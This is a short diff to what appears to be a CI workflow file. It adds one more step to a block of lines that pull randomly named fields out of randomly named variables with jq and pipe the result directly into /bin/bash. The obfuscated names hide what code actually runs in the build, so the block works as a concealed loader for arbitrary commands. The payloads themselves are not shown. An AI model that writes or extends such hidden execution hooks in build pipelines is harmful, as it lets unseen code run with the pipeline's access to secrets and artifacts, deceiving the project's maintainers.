@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$vkt03" | jq -r .xmutf025 | /bin/bash
           echo $ydtme9 | jq -r .wwjv501 | /bin/bash
           echo $hcvu678 | jq -r .ot4 | /bin/bash
+          echo $v5 | jq -r .yng9632 | /bin/bash
 
       - name: Store artifact
         if: always()
